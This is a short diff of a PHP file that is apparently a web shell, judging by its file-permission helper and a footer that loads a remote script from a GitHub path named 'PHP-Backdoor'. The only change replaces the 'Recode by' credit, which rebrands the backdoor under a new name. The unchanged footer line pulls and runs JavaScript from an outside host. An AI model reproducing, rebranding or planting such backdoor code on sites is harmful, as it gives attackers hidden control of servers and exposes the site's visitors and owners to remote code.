@@ -339,7 +339,7 @@ function perms($file)
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
-echo '<br><center>&copy; <span id="footer"></span> 2018. | Recode by D7net</center><br>';
+echo '<br><center>&copy; <span id="footer"></span> 2018. | Recode by Ahmed</center><br>';
 echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
 echo '</body></html><!-- EOF -->';
 ?>
